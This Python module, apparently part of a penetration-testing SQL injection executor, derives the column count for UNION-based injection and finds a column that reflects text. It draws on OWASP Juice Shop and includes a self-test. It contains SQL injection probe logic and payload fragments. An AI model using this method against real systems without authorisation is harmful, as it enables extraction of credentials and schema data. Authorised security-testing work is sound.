#!/usr/bin/env python3
"""
sqli_union.py -- deterministic UNION column-count derivation for the SQLi executor.

WHY THIS EXISTS (recall fix, 2026-11-01):
  A UNION-based SQLi executor must DERIVE the number of result columns before it can
  splice a UNION SELECT. The common failure mode is to *assume* a count (or to copy a
  payload that hard-codes one) and then treat the resulting HTTP 500 / SQL error as
  "not injectable" and give up. That is a silent false negative.

  Live proof: OWASP Juice Shop v20.3.0 `/rest/products/search` is injectable, but its
  Products table has **10** columns (an `alternateImages` column was added) -- not the 9
  that older write-ups and the payload corpus assumed. A UNION guessing 9 columns 500s;
  a scan that stops its ORDER BY sweep at 9 (as the old refs example literally did) never
  finds 10 and reports the endpoint clean. Two real challenges (User Credentials, Database
  Schema) are lost that way.

THE RULE THIS ENCODES:
  1. Derive the count; never assume it.
  2. The sweep is OPEN-ENDED -- no hard ceiling at 9/10/16. Grow exponentially to bracket
     the boundary, then binary-search it, up to a sane safety bound far above any real table.
  3. An error on a probe is the boundary SIGNAL, not a reason to abandon the point. A UNION
     that errors for a guessed N means "wrong N", not "not injectable" -- that is an
     open-proof-gap (see _contract/counterevidence.md), never a silent "ruled out".
  4. Confirm the derived count a SECOND, mechanistically-different way (UNION SELECT NULL*N)
     before extracting -- two independent observations, per counterevidence.

This module is PURE LOGIC: the caller injects probe callbacks that perform the actual
requests, so the algorithm is deterministic and unit-testable with no network (the CI
convention -- see benchmark/README.md). The executor wires the callbacks to its interceptor
and scope/rate-limit ladder.

Stdlib only. `python scripts/sqli_union.py --selftest` runs the self-test.
"""
from __future__ import annotations

from typing import Callable, Optional

# Safety bound: far above any real table's column count, but keeps a misbehaving probe
# (e.g. one that returns True for everything) from looping forever. Not a feature ceiling.
MAX_COLUMNS = 1024


class ColumnCountError(RuntimeError):
    """The count could not be derived (probe inconsistent, or baseline not injectable)."""


def derive_column_count(
    order_by_ok: Callable[[int], bool],
    max_columns: int = MAX_COLUMNS,
) -> int:
    """Return the number of result columns via an OPEN-ENDED ORDER BY sweep.

    `order_by_ok(n)` performs `... ORDER BY n -- -` against the injection point and returns
    True when the response is a normal result (n <= column_count) and False when it errors /
    differs (n > column_count). The column count is the largest n for which it returns True.

    Exponential bracketing + binary search: O(log columns) probes, no hard-coded ceiling.
    Raises ColumnCountError if `ORDER BY 1` is not accepted (the point is not usable for
    UNION here -- that is a context/injection problem to carry as an open-proof-gap, NOT a
    silent clean result) or if the boundary exceeds `max_columns`.
    """
    if max_columns < 1:
        raise ValueError("max_columns must be >= 1")

    # Baseline: ORDER BY 1 is valid for any SELECT. If it fails, the breakout/context is
    # wrong -- do NOT conclude "not injectable"; the caller records an open-proof-gap.
    if not order_by_ok(1):
        raise ColumnCountError(
            "ORDER BY 1 rejected: breakout/context not established -- open-proof-gap, not a clean result"
        )

    # Exponential growth to find an upper bound `hi` that FAILS, with the last OK value `lo`.
    lo = 1
    hi = 2
    while order_by_ok(hi):
        lo = hi
        hi *= 2
        if lo >= max_columns:
            raise ColumnCountError(
                f"column count exceeds safety bound {max_columns}: probe may be returning True unconditionally"
            )
    hi = min(hi, max_columns + 1)

    # Binary-search the boundary in (lo, hi): lo is OK, hi is the first failing value.
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if order_by_ok(mid):
            lo = mid
        else:
            hi = mid
    return lo


def confirm_column_count(
    union_nulls_ok: Callable[[int], bool],
    count: int,
) -> bool:
    """Second, mechanistically-different confirmation (counterevidence).

    `union_nulls_ok(n)` fires a `UNION SELECT <n placeholders> -- -` and returns True iff it is
    accepted. A correct `count` is accepted; `count+1` is not. Returns True only when the derived
    count is corroborated by this independent method.

    NOTE (live lesson, Juice Shop): prefer TYPED placeholders (`'1','2',..`) over all-`NULL` rows.
    Many apps (e.g. Node/Express) post-process the result set and throw on an all-NULL row even
    though the SQL UNION itself succeeded -- an all-NULL probe then false-negatives and hides a
    valid count. The count is still a boundary fact; just confirm it with values, not NULLs.
    """
    if count < 1:
        return False
    if not union_nulls_ok(count):
        return False
    # A genuinely correct count should not also accept count+1 (that would mean the ORDER BY
    # sweep under-counted). count-1 is allowed to differ; we only need positive corroboration.
    return not union_nulls_ok(count + 1)


def string_column_index(
    union_marker_ok: Callable[[int, int], bool],
    count: int,
) -> Optional[int]:
    """Find a 0-based column index that renders a text marker (where to pack the proof value).

    `union_marker_ok(count, i)` fires `UNION SELECT NULL,..,'marker'(at i),..,NULL` and returns
    True iff the marker is reflected. Returns the first such index, or None if no column renders
    text (extraction then needs CAST/boolean-blind instead).
    """
    for i in range(count):
        if union_marker_ok(count, i):
            return i
    return None


# --------------------------------------------------------------------------------------
# Self-test (no network; pure logic). Wired into scripts/validate.py like cvss/coverage.
# --------------------------------------------------------------------------------------
def selftest() -> None:
    # 1) Exact counts across a wide range, including the Juice Shop 10-column regression and
    #    counts above the old hard-coded 9/16 ceilings.
    for true_count in [1, 2, 3, 5, 8, 9, 10, 13, 16, 17, 26, 50, 127, 300]:
        got = derive_column_count(lambda n, c=true_count: n <= c)
        assert got == true_count, f"derive: expected {true_count}, got {got}"

    # 2) REGRESSION: the exact Juice Shop v20.3.0 case. A sweep capped at 9 (the old bug)
    #    would return 9 and miss the real 10 -> make the gap explicit.
    juice = 10
    assert derive_column_count(lambda n: n <= juice) == 10
    capped_at_9 = max((n for n in range(1, 10) if n <= juice), default=0)  # old linear-to-9 scan
    assert capped_at_9 == 9, "sanity: the old capped scan returns 9"
    assert capped_at_9 != juice, "regression: capped-at-9 scan silently misses the 10th column"

    # 3) An error / exception from the probe is the BOUNDARY, never a bail: a probe that
    #    RAISES for n > count must still yield the right count (caller catches -> False).
    def raising_probe(n, c=10):
        if n > c:
            raise RuntimeError("SQLITE_ERROR: ORDER BY term out of range")
        return True

    def safe(n):
        try:
            return raising_probe(n)
        except RuntimeError:
            return False

    assert derive_column_count(safe) == 10, "an erroring probe must mark the boundary, not abort"

    # 4) Baseline not injectable -> explicit error (open-proof-gap), NOT a silent 0/clean.
    try:
        derive_column_count(lambda n: False)
        raise AssertionError("expected ColumnCountError when ORDER BY 1 is rejected")
    except ColumnCountError:
        pass

    # 5) Unbounded/true-for-everything probe is caught by the safety bound, not an infinite loop.
    try:
        derive_column_count(lambda n: True, max_columns=64)
        raise AssertionError("expected ColumnCountError when probe never fails")
    except ColumnCountError:
        pass

    # 6) Second-method confirmation corroborates the right count and rejects a wrong one.
    assert confirm_column_count(lambda n: n == 10, 10) is True   # exact boundary corroborated
    assert confirm_column_count(lambda n: n <= 10, 10) is True   # 10 ok, 11 not -> still the boundary
    assert confirm_column_count(lambda n: n <= 11, 10) is False  # 11 also ok -> derived 10 under-counts
    assert confirm_column_count(lambda n: n == 9, 10) is False   # 10 not even accepted

    # 7) String-column location.
    assert string_column_index(lambda c, i: i == 1, 10) == 1
    assert string_column_index(lambda c, i: False, 10) is None

    print("sqli_union selftest: OK")


if __name__ == "__main__":
    import sys
    if "--selftest" in sys.argv:
        selftest()
    else:
        print(__doc__)
